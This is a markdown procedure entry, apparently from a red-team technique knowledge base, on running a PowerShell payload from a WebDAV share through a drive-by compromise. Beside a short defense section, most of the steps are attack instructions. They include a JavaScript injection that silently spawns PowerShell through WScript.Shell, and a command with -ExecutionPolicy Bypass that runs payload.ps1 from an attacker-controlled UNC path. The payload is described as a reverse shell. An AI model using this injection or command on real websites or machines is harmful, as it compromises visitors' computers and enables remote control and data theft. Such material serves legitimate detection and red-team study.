---
id: fff086f5-2c2c-4cd0-a19e-42a38206e1d0
name: Windows-Download-and-Execute-via-WebDAV
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.785825+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Drive-by Compromise|T1189 - Drive-by Compromise]]'
  - '[[techniques/PowerShell|T1086 - PowerShell]]'
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques: []
tags:
  - '[[tags/Powershell]]'
  - '[[tags/Windows - Download and execute methods]]'
commands:
  - '[[commands/powershell-execute-remote-webdav-script]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-Download-and-Execute-via-WebDAV

## Summary

This procedure uses PowerShell on a Windows target to download and execute a remote script hosted on a WebDAV server. It is commonly employed in drive-by compromise attacks where a compromised website injects code to trigger the PowerShell execution upon user visitation, allowing attackers to deliver and run payloads while potentially evading network restrictions.

## Description

In this technique, an attacker first compromises a legitimate website to inject malicious content, such as JavaScript that leverages browser capabilities (e.g., ActiveX or HTA files) to invoke PowerShell on the victim's Windows machine. The injected code then runs a PowerShell command to connect to the attacker's WebDAV server via UNC path (\\server\share) and download a payload script (e.g., payload.ps1), which is immediately executed. WebDAV is used because it blends with legitimate file sharing traffic and can traverse firewalls. The -ExecutionPolicy Bypass flag overrides any restrictive PowerShell policies, and the payload can install backdoors, exfiltrate data, or escalate privileges. This method targets environments with outbound WebDAV access allowed, common in corporate networks. Success relies on the target having PowerShell v2+ and no advanced endpoint detection blocking UNC executions.

## Requirements

1. Access to a compromised website capable of injecting executable content (e.g., via XSS or server-side inclusion) to trigger PowerShell.
2. A WebDAV server (e.g., using Apache with mod_dav or IIS) hosting the payload.ps1 file, accessible via UNC path from the target network.
3. Target system running Windows (7+) with PowerShell enabled and network access to the WebDAV server; no admin privileges needed for initial execution.
4. Payload.ps1 prepared as a malicious script (e.g., reverse shell or downloader).

## Defense

- Deploy web application firewalls (WAFs) to scan and block malicious injections on websites, focusing on script tags and ActiveX invocations.
- Monitor PowerShell execution logs (via Sysmon or PowerShell logging) for Bypass policy usage and UNC path accesses; alert on anomalous script downloads.
- Restrict outbound WebDAV traffic (ports 80/443 to non-standard servers) using network segmentation and proxy inspection.
- Enable application whitelisting (e.g., AppLocker) to block unsigned PowerShell scripts and enforce execution policies.
- Regularly patch browsers and Windows to mitigate drive-by compromise vectors like vulnerable ActiveX controls.

## Objectives

1. Achieve initial code execution on the target Windows system via a drive-by compromise.
2. Transfer and run a payload script from a remote WebDAV server to establish persistence or further compromise.
3. Bypass execution restrictions and blend with legitimate traffic to evade detection.

## Instructions

### Step 1: Prepare the WebDAV Server and Payload

**Context**: Set up the attacker's WebDAV server to host the payload script, ensuring it's accessible via UNC path. This step occurs on the attacker side before targeting the website.

Create or verify the payload.ps1 (e.g., a simple reverse shell script) and place it in a shared folder on the WebDAV server. Test accessibility from a similar network.

No specific command here; use server tools to configure the share.

**Expected Output**: Payload.ps1 visible and downloadable via \\webdavserver\folder\payload.ps1 from a test Windows machine.

### Step 2: Inject Trigger Code into Compromised Website

**Context**: Modify the compromised website to include code that executes PowerShell when visited by the target user. This could be JavaScript invoking PowerShell via WMI or an HTA file.

Example injection (via XSS): Embed a script tag that uses ActiveXObject to run PowerShell. For simplicity, assume server-side injection allows direct PowerShell invocation on load.

**Command** (Custom injection, not linked to a command doc):
```javascript
<script>var shell = new ActiveXObject('WScript.Shell'); shell.Run('powershell -ExecutionPolicy Bypass -File \\\webdavserver\folder\payload.ps1', 0, false);</script>
```

> This JavaScript snippet creates a hidden PowerShell process to download and execute the remote script silently. Adjust the UNC path as needed. Expected: No visible output on the page; PowerShell process spawns in task manager.

### Step 3: Execute Download and Run on Target

**Context**: Once the website is visited, the injected code triggers this PowerShell command to fetch and execute the payload from WebDAV. This step verifies the technique in a controlled environment.

Use the following command directly in PowerShell or via the injection.

**Command** ([[commands/powershell-execute-remote-webdav-script]]):
```powershell
powershell -ExecutionPolicy Bypass -File \\webdavserver\folder\payload.ps1
```

> This command sets the execution policy to Bypass, then loads and runs the specified .ps1 file from the WebDAV UNC path. If the payload.ps1 contains a reverse shell, it will connect back to the attacker. Run this in an authorized test environment only.

**Expected Output**: The payload.ps1 executes without errors; for example, if it's a downloader, it may fetch additional files or establish a connection. Check PowerShell output for script completion or errors like 'Access Denied' if the share is restricted.

### Step 4: Verify Execution and Cleanup

**Context**: Confirm the payload ran successfully and monitor for indicators of compromise (IoCs) like new processes or network connections.

On the attacker side, check listener for connections if payload includes a shell. On target, use Task Manager or `Get-Process` to see spawned processes.

**Command** (PowerShell built-in, no link needed):
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*payload*"}
```

> Lists processes related to the payload. Expected: Evidence of execution, such as a new cmd.exe or custom process.

**Expected Output**: List of running processes confirming payload activity; no errors indicate success.
